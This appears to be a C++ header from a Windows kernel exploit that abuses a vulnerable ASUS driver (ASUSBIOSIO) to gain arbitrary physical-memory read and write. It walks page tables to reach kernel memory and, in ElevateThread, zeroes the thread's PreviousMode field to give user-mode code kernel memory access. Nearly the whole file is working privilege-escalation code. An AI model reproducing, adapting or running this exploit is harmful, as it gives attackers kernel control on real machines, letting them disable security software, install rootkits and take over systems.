#pragma once
#include "service.h"
#include "superfetch/superfetch.h"

#define DEVICE_TYPE_          (DWORD)0x8010
#define MAP_SECTION_FUNCID    (DWORD)0x810
#define UNMAP_SECTION_FUNCID  (DWORD)0x811

#define IOCTL_MAP_USER_PHYSICAL_MEMORY      \
    CTL_CODE(DEVICE_TYPE_, MAP_SECTION_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS)   // 0x80102040

#define IOCTL_UNMAP_USER_PHYSICAL_MEMORY    \
    CTL_CODE(DEVICE_TYPE_, UNMAP_SECTION_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80102044

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT)_PHYSICAL_MEMORY_INFO {
	SIZE_T MapSize;
	ULARGE_INTEGER PhysicalAddress;
	HANDLE SectionHandle;
	PVOID MappedBaseAddress;
	PVOID Object;
} PHYSICAL_MEMORY_INFO, * PPHYSICAL_MEMORY_INFO;

#define PAGE_SIZE 0x1000

class ASUSWrapper
{
public:
	HANDLE hDevice = INVALID_HANDLE_VALUE;
	uintptr_t system_cr3 = 0;


	ASUSWrapper()
	{
		service::Drop();
		service::Load();

		this->hDevice = CreateFileA(("\\\\.\\ASUSBIOSIO"), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

		if (this->hDevice == INVALID_HANDLE_VALUE)
			exit(0);
	}

	VOID Close() {
		CloseHandle(this->hDevice);

		service::Cleanup();
		service::Remove();
	}


	uintptr_t map_physical(_In_ ULONG_PTR PhysicalAddress, _In_ ULONG NumberOfBytes, _Inout_ HANDLE* SectionHandle, _Inout_ PVOID* Object)
	{
		ULONG_PTR offset;
		ULONG mapSize;
		PHYSICAL_MEMORY_INFO request;

		RtlSecureZeroMemory(&request, sizeof(request));

		offset = PhysicalAddress & ~(PAGE_SIZE - 1);
		mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

		request.PhysicalAddress.QuadPart = PhysicalAddress;
		request.MapSize = mapSize;

		if (DeviceIoControl(this->hDevice,
			IOCTL_MAP_USER_PHYSICAL_MEMORY,
			&request,
			sizeof(request),
			&request,
			sizeof(request),
			NULL,
			NULL))
		{
			if (SectionHandle)
				*SectionHandle = request.SectionHandle;

			if (Object)
				*Object = request.Object;

			return (uintptr_t)request.MappedBaseAddress;
		}

		return NULL;
	}

	bool unmap_physical(_In_ PVOID AdressToUnmap, HANDLE Section, PVOID Object)
	{
		PHYSICAL_MEMORY_INFO request;

		RtlSecureZeroMemory(&request, sizeof(request));

		request.MappedBaseAddress = AdressToUnmap;
		request.SectionHandle = Section;
		request.Object = Object;

		return DeviceIoControl(this->hDevice,
			IOCTL_UNMAP_USER_PHYSICAL_MEMORY,
			&request,
			sizeof(request),
			&request,
			sizeof(request),
			NULL,
			NULL);
	}


	bool read_physical_memory(uintptr_t physical_address, void* output, unsigned long size)
	{
		HANDLE SectionHandle = NULL;
		PVOID Object = NULL;

		uintptr_t virtual_address = map_physical(physical_address, size, &SectionHandle, &Object);

		if (!virtual_address)
			return false;

		memcpy(output, reinterpret_cast<void*>(virtual_address), size);
		unmap_physical((PVOID)virtual_address, SectionHandle, Object);
		return true;
	}

	bool write_physical_memory(uintptr_t physical_address, void* data, unsigned long size)
	{
		if (!data)
			return false;

		HANDLE SectionHandle = NULL;
		PVOID Object = NULL;

		uintptr_t virtual_address = map_physical(physical_address, size, &SectionHandle, &Object);

		if (!virtual_address)
			return false;

		memcpy(reinterpret_cast<void*>(virtual_address), reinterpret_cast<void*>(data), size);
		unmap_physical((PVOID)virtual_address, SectionHandle, Object);
		return true;
	}
	
	uintptr_t get_system_dirbase()
	{
		for (int i = 0; i < 10; i++)
		{
			HANDLE SectionHandle = NULL;
			PVOID Object = NULL;

			uintptr_t lpBuffer = map_physical(i * 0x10000, 0x10000, &SectionHandle, &Object);
			if (!lpBuffer)
				continue;

			for (int uOffset = 0; uOffset < 0x10000; uOffset += 0x1000)
			{
				if (0x00000001000600E9 ^ (0xffffffffffff00ff & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset)))
					continue;
				if (0xfffff80000000000 ^ (0xfffff80000000000 & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0x70)))
					continue;
				if (0xffffff0000000fff & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0xa0))
					continue;

				uintptr_t cr3 = *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0xa0);
				unmap_physical((PVOID)lpBuffer, SectionHandle, Object);
				printf("[+] get_system_dirbase: Found CR3 at PA 0x%llx = 0x%llx\n", (uintptr_t)(i * 0x10000 + uOffset + 0xa0), cr3);
				return cr3;
			}

			unmap_physical((PVOID)lpBuffer, SectionHandle, Object);
		}

		return NULL;
	}

	// Page table entry structure following KernelForge approach
	#define PTE_PRESENT_BIT      0x1
	#define PTE_PS_BIT           0x80      // Page Size bit (1GB or 2MB pages)
	
	// Physical address masks (bits 51:12/21/30, excluding reserved and NX bit 63)
	#define PTE_PFN_MASK_4K      0x000FFFFFFFFFF000ULL  // Bits 51:12 for 4KB pages
	#define PTE_PFN_MASK_2M      0x000FFFFFFFE00000ULL  // Bits 51:21 for 2MB pages
	#define PTE_PFN_MASK_1G      0x000FFFFFC0000000ULL  // Bits 51:30 for 1GB pages
	#define PTE_PFN_MASK         PTE_PFN_MASK_4K        // Default for 4KB
	#define PAGE_SHIFT           12

	#define PFN_TO_PAGE(_val_) (((DWORD64)(_val_)) << PAGE_SHIFT)
	#define PML4_ADDRESS(_val_) ((_val_) & 0x000FFFFFFFFFF000ULL)  // Mask out high bits
	
	#define PML4_INDEX(_addr_) (((DWORD64)(_addr_) >> 39) & 0x1ff)
	#define PDPT_INDEX(_addr_) (((DWORD64)(_addr_) >> 30) & 0x1ff)
	#define PDE_INDEX(_addr_)  (((DWORD64)(_addr_) >> 21) & 0x1ff)
	#define PTE_INDEX(_addr_)  (((DWORD64)(_addr_) >> 12) & 0x1ff)
	
	#define PAGE_OFFSET_4K(_addr_) ((DWORD64)(_addr_) & 0xfff)
	#define PAGE_OFFSET_2M(_addr_) ((DWORD64)(_addr_) & 0x1fffff)
	#define PAGE_OFFSET_1G(_addr_) ((DWORD64)(_addr_) & 0x3fffffff)

	uintptr_t get_pml4_from_processor_start_block()
	{
		// PROCESSOR_START_BLOCK is allocated by winload.efi in low memory (0x0 - 0x10000)
		for (DWORD_PTR addr = 0; addr < 0x10000; addr += 0x1000)
		{
			HANDLE SectionHandle = NULL;
			PVOID Object = NULL;

			uintptr_t lpBuffer = map_physical(addr, 0x1000, &SectionHandle, &Object);
			if (!lpBuffer)
				continue;

			// PROCESSOR_START_BLOCK signature check:
			// Jmp.OpCode == 0xE9, CompletionFlag == 1, HalpLMStub != 0, Cr3 != 0
			BYTE jmpOpCode = *reinterpret_cast<BYTE*>(lpBuffer);
			DWORD completionFlag = *reinterpret_cast<DWORD*>(lpBuffer + 3);
			uintptr_t halpLMStub = *reinterpret_cast<uintptr_t*>(lpBuffer + 0x70);
			uintptr_t cr3Value = *reinterpret_cast<uintptr_t*>(lpBuffer + 0xa0);

			unmap_physical((PVOID)lpBuffer, SectionHandle, Object);

			// Validate PROCESSOR_START_BLOCK
			if (jmpOpCode == 0xE9 && completionFlag == 1 && halpLMStub != 0 && cr3Value != 0)
			{
				// Additional sanity check: CR3 should be page-aligned and in reasonable range
				if ((cr3Value & 0xFFF) == 0 && cr3Value < 0x100000000ULL)
				{
					printf("[+] Found PROCESSOR_START_BLOCK at PA 0x%llx\n", addr);
					printf("[+] Kernel PML4 address: 0x%llx\n", cr3Value);
					return cr3Value;
				}
			}
		}

		printf("[-] PROCESSOR_START_BLOCK not found, falling back to get_system_dirbase()\n");
		return get_system_dirbase();
	}

	uintptr_t convert_virtual_to_physical(uintptr_t virtual_address)
	{
		if (!system_cr3)
			system_cr3 = get_pml4_from_processor_start_block();

		if (!system_cr3)
		{
			printf("[-] convert_virtual_to_physical: No valid PML4 address\n");
			return 0;
		}

		uintptr_t pml4_base = PML4_ADDRESS(system_cr3);
		
		// Step 1: Read PML4 entry
		uintptr_t pml4e_pa = pml4_base + PML4_INDEX(virtual_address) * sizeof(uintptr_t);
		uintptr_t pml4e = 0;
		read_physical_memory(pml4e_pa, &pml4e, sizeof(pml4e));

		if ((pml4e & PTE_PRESENT_BIT) == 0)
		{
			printf("[-] PML4E not present for VA 0x%llx (PML4E=0x%llx at PA 0x%llx)\n", virtual_address, pml4e, pml4e_pa);
			return 0;
		}

		// Step 2: Read PDPT entry
		uintptr_t pdpte_pa = (pml4e & PTE_PFN_MASK_4K) + PDPT_INDEX(virtual_address) * sizeof(uintptr_t);
		uintptr_t pdpte = 0;
		read_physical_memory(pdpte_pa, &pdpte, sizeof(pdpte));

		if ((pdpte & PTE_PRESENT_BIT) == 0)
		{
			printf("[-] PDPTE not present for VA 0x%llx (PDPTE=0x%llx)\n", virtual_address, pdpte);
			return 0;
		}

		// Check for 1GB page
		if (pdpte & PTE_PS_BIT)
		{
			uintptr_t pa = (pdpte & PTE_PFN_MASK_1G) + PAGE_OFFSET_1G(virtual_address);
			printf("[DEBUG] 1GB page: VA 0x%llx -> PA 0x%llx\n", virtual_address, pa);
			return pa;
		}

		// Step 3: Read PD entry
		uintptr_t pde_pa = (pdpte & PTE_PFN_MASK_4K) + PDE_INDEX(virtual_address) * sizeof(uintptr_t);
		uintptr_t pde = 0;
		read_physical_memory(pde_pa, &pde, sizeof(pde));

		if ((pde & PTE_PRESENT_BIT) == 0)
		{
			printf("[-] PDE not present for VA 0x%llx (PDE=0x%llx)\n", virtual_address, pde);
			return 0;
		}

		// Check for 2MB page
		if (pde & PTE_PS_BIT)
		{
			// For 2MB pages: bits 51:21 contain the physical page base (masked to exclude NX bit)
			uintptr_t pa = (pde & PTE_PFN_MASK_2M) + PAGE_OFFSET_2M(virtual_address);
			printf("[DEBUG] 2MB page: VA 0x%llx -> PA 0x%llx (PDE=0x%llx)\n", virtual_address, pa, pde);
			return pa;
		}

		// Step 4: Read PT entry (4KB page)
		uintptr_t pte_pa = (pde & PTE_PFN_MASK_4K) + PTE_INDEX(virtual_address) * sizeof(uintptr_t);
		uintptr_t pte = 0;
		read_physical_memory(pte_pa, &pte, sizeof(pte));

		if ((pte & PTE_PRESENT_BIT) == 0)
		{
			printf("[-] PTE not present for VA 0x%llx (PTE=0x%llx)\n", virtual_address, pte);
			return 0;
		}

		return (pte & PTE_PFN_MASK_4K) + PAGE_OFFSET_4K(virtual_address);
	}

};

ASUSWrapper ASUSIo;

ULONG64 GetEProcessViaPID(ULONG TargetProcessId)
{
    HANDLE hHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetProcessId);
    return GetKernelObject(TargetProcessId, hHandle);
}

ULONG64 GetCurrentEProcess()
{
    return GetEProcessViaPID(GetCurrentProcessId());
}

ULONG64 GetCurrentKThread()
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    return GetKernelObject(GetCurrentProcessId(), hThread);
}

ULONG64 GetKThread(ULONG TargetProcessId, ULONG TargetThreadId)
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, TargetThreadId);
    return GetKernelObject(TargetProcessId, hThread);
}

// Global superfetch memory map (initialized once)
static std::unique_ptr<spf::memory_map> g_MemoryMap = nullptr;

bool InitializeSuperfetchMemoryMap()
{
	auto result = spf::memory_map::current();
	if (!result) {
		printf("[-] Failed to initialize superfetch memory map\n");
		return false;
	}
	g_MemoryMap = std::make_unique<spf::memory_map>(std::move(*result));
	printf("[+] Superfetch memory map initialized with %zu translations\n", 
		g_MemoryMap->translations().size());
	return true;
}

// Initialize PML4 from PROCESSOR_START_BLOCK before any translations
bool InitializePageTableBase()
{
	if (ASUSIo.system_cr3 == 0)
	{
		ASUSIo.system_cr3 = ASUSIo.get_pml4_from_processor_start_block();
	}
	return ASUSIo.system_cr3 != 0;
}

// Set CR3 explicitly (useful when we already know the correct value)
void SetSystemCr3(uintptr_t cr3)
{
	ASUSIo.system_cr3 = cr3;
	printf("[+] System CR3 set to: 0x%llx\n", cr3);
}

// Get CR3 from a known EPROCESS physical address + 0x28 offset
uintptr_t GetCr3FromEprocessPhysical(uintptr_t eprocess_pa)
{
	uintptr_t cr3 = 0;
	ASUSIo.read_physical_memory(eprocess_pa + 0x28, &cr3, sizeof(cr3));
	return cr3;
}

bool ReadKernelMemory2(PVOID Source, PVOID Buffer, ULONG Size)
{
	if (!Source || !Buffer || !Size)
		return false;

	uintptr_t physical_address = ASUSIo.convert_virtual_to_physical((uintptr_t)Source);

	if (physical_address) {
		printf("[DEBUG] ReadKernelMemory: VA 0x%llx -> PA 0x%llx (size: %u)\n", (uintptr_t)Source, physical_address, Size);
		ASUSIo.read_physical_memory(physical_address, reinterpret_cast<LPVOID>((uintptr_t)Buffer), Size);
		
		// Debug: print first 8 bytes of what we read
		if (Size >= 8) {
			printf("[DEBUG] First 8 bytes read: 0x%llx\n", *(uintptr_t*)Buffer);
		}
		return true;
	}

	// Fallback to superfetch if page table walk fails
	if (g_MemoryMap) {
		physical_address = g_MemoryMap->translate(Source);
		if (physical_address) {
			printf("[DEBUG] ReadKernelMemory (superfetch): VA 0x%llx -> PA 0x%llx\n", (uintptr_t)Source, physical_address);
			ASUSIo.read_physical_memory(physical_address, reinterpret_cast<LPVOID>((uintptr_t)Buffer), Size);
			return true;
		}
	}

	printf("[-] ReadKernelMemory: VA->PA translation failed for 0x%llx\n", (uintptr_t)Source);
	return false;
}


bool WriteKernelMemory2(PVOID Source, PVOID Buffer, ULONG Size)
{
	uintptr_t physical_address = ASUSIo.convert_virtual_to_physical((uintptr_t)Source);

	if (!physical_address)
		return false;

	ASUSIo.write_physical_memory(physical_address, reinterpret_cast<LPVOID>((uintptr_t)Buffer), Size);
	return true;
}

bool ReadKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)
{
	size_t cbNumOfBytesRead = 0;

	NTSTATUS Status = NtReadVirtualMemory(GetCurrentProcess(), Source, Buffer, Size, (PULONG)&cbNumOfBytesRead);
	if (!NT_SUCCESS(Status))
	{
		return false;
	}

	return true;
}
bool WriteKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)
{
	size_t cbNumOfBytesWrite = 0;

	NTSTATUS Status = NtWriteVirtualMemory(GetCurrentProcess(), Source, Buffer, Size, (PULONG)&cbNumOfBytesWrite);

	if (!NT_SUCCESS(Status))
	{
		return false;
	}
	return true;
}


bool ElevateThread(uintptr_t TargetKThread)
{
	ASUSWrapper AsusIo = ASUSWrapper();
	InitializeSuperfetchMemoryMap();
	InitializePageTableBase();
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");

	if (!hNtdll)
	{
		printf("[-] Failed to obtain ntdll..\n");
		return false;
	}

	NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	// NtFsControlFile = (PNtFsControlFile)GetProcAddress(hNtdll, "NtFsControlFile");

	if (!NtReadVirtualMemory || !NtWriteVirtualMemory)
	{
		printf("[-] Failed to obtain required functions..\n");
		return false;
	}

	auto const mm = spf::memory_map::current();
	if (!mm) {
		printf("Failed to get current memory map from Superfetch! Status : 0x%x\n", mm.error());
	}

	uint64_t phys = mm->translate(reinterpret_cast<PVOID>(TargetKThread + KTHREAD_PreviousMode));
	char mode = 0;
	AsusIo.write_physical_memory(phys, &mode, sizeof(char));
	//AsusIo.Close();



	return true;
}
